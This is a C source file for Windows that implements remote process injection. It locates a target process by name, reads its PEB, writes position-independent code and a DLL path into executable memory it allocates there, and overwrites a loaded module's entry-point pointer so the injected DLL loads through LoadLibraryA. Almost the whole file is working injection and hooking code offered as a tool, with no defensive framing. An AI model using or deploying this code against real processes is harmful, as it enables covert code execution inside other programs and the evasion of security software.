#include <Windows.h>
#include <Shlwapi.h>
#include <stdio.h>

#include "definitions.h"
#include "ldr_injector.h"
#include "../Payload/pic_loader.h"
#include "remote_peb_finder.h"


DWORD WINAPI NullActionThreadFunction( LPVOID lpParam );


PPEB getPebAddr(void)
{
	__asm mov eax, fs:[0x30]
}



bool injectAndHook( DWORD remoteProcessId, DWORD remoteHookedAddress, DWORD remoteModuleBaseAddress, const char * injectedDllPath )
{
	
	HANDLE remoteProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION , FALSE, remoteProcessId);

	if (NULL == remoteProcess)
	{
		return false;
	}


	printf("Reading the original value we hook\n");

	DWORD originalEntryPointValue = 0, numBytesRead = 0;
	if (FALSE == ReadProcessMemory(remoteProcess, (LPCVOID)remoteHookedAddress, &originalEntryPointValue, sizeof(DWORD), &numBytesRead)
		|| 0 == numBytesRead)
	{

		return false;

	}

	

	// Let's first check if we can, using our security token, write to the hook address
	
	//DWORD remoteHookedAddressPreviousAttribute = 0;
	//if (FALSE == VirtualProtectEx(remoteProcess, (LPVOID)remoteHookedAddress, sizeof(DWORD), PROCESS_VM_WRITE  ,&remoteHookedAddressPreviousAttribute ))
	//{

	//	CloseHandle(remoteProcess);

	//	return false;
	//	
	//}



	
	PayloadParameters parameters = {0};

	DWORD functionLength = (DWORD)emptyFunc - (DWORD)hookFunc;
	DWORD bufSize = functionLength + sizeof(PayloadParameters);


	LPVOID pBuf = VirtualAllocEx(remoteProcess, NULL, bufSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	printf("Injecting code and data in %x-%x\n", (DWORD)pBuf, (DWORD)pBuf + bufSize);

	if (NULL != pBuf)
	{
		
		parameters.MAGIC = MAGIC_VALUE;
		StrCpyA(parameters.m_DllPath, injectedDllPath);
		parameters.m_originalDllMain = (DLL_MAIN_FUNC)(originalEntryPointValue);
		HMODULE localKernel32ModuleAddress = LoadLibraryA("kernel32.dll");

		parameters.m_loadLibraryA = (LOAD_LIBRARYA_FUNC)((DWORD)remoteModuleBaseAddress - (DWORD)localKernel32ModuleAddress + 
			(DWORD)GetProcAddress(localKernel32ModuleAddress, "LoadLibraryA"));

	}

	//memcpy_s(pBuf, bufSize, (LPVOID)&parameters, sizeof(PayloadParameters));



	printf("Writing PIC code parameters in remote process\n");

	DWORD bytesWritten = 0;
	if (FALSE == WriteProcessMemory(remoteProcess, pBuf, &parameters, sizeof(PayloadParameters), &bytesWritten) 
		|| 0 == bytesWritten)
	{
		
		VirtualFreeEx(remoteProcess, pBuf, bufSize, MEM_FREE);
		CloseHandle(remoteProcess);
		return false;

	}


	printf("Writing PIC code in remote process\n");
	if (FALSE == WriteProcessMemory(remoteProcess, (LPVOID)((DWORD)pBuf + sizeof(PayloadParameters)), &hookFunc, sizeof(PayloadParameters), &bytesWritten)
		|| 0 == bytesWritten)
	{
		
		VirtualFreeEx(remoteProcess, pBuf, bufSize, MEM_FREE);
		CloseHandle(remoteProcess);
		return false;

	}




	printf("Changing the permissions of the remote hooked pointer\n");
	DWORD oldProtect = 0;
	if (FALSE == VirtualProtectEx(remoteProcess, (LPVOID)remoteHookedAddress, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
	{
	
		VirtualFreeEx(remoteProcess, pBuf, bufSize, MEM_FREE);
		CloseHandle(remoteProcess);
		return false;
	
	}



	printf("Assigning the PIC code address to the hooked address\n");
	DWORD remotePicFunctionAddress = (DWORD)pBuf + sizeof(PayloadParameters);

	if (FALSE == WriteProcessMemory(remoteProcess, (LPVOID)remoteHookedAddress, &remotePicFunctionAddress, sizeof(DWORD), &bytesWritten)
		|| 0 == bytesWritten)
	{

		VirtualProtectEx(remoteProcess, (LPVOID)remoteHookedAddress, sizeof(DWORD), oldProtect, &oldProtect);
		
		VirtualFreeEx(remoteProcess, pBuf, bufSize, MEM_FREE);
		CloseHandle(remoteProcess);
		return false;

	}


	printf("Assigned the PIC code address to the hooked address successfully!\n");
	
	VirtualProtectEx(remoteProcess, (LPVOID)remoteHookedAddress, sizeof(DWORD), oldProtect, &oldProtect);
	

	return true;

}


bool injectLdr( const char * targetProcessName, const wchar_t * remoteModuleName, const char * injectedDllPath )
{
	
	DWORD remotePid = getPidByName(targetProcessName);

	if (0 == remotePid)
	{

		printf("Cannot find the pid of %s\n", targetProcessName);
				
		return false;

	}


		
	DWORD remotePebAddress = getRemotePebAddress(remotePid);

	if (NULL == remotePebAddress)
	{

		printf("Cannot find the PEB address of %d process\n", remotePid);

		return false;

	}




	DWORD remoteModuleBaseAddress = 0, remoteModuleEntryPointPointer = 0;

	if (FALSE == getRemoteModuleInjectionNecessaryData(remoteModuleName, remotePid, remotePebAddress, &remoteModuleEntryPointPointer, &remoteModuleBaseAddress))
	{

		return false;

	}


	if (false == injectAndHook(remotePid, remoteModuleEntryPointPointer, remoteModuleBaseAddress, injectedDllPath))
	{

		return false;

	}

	printf("Injected the code successfully\n");


	return true;
}
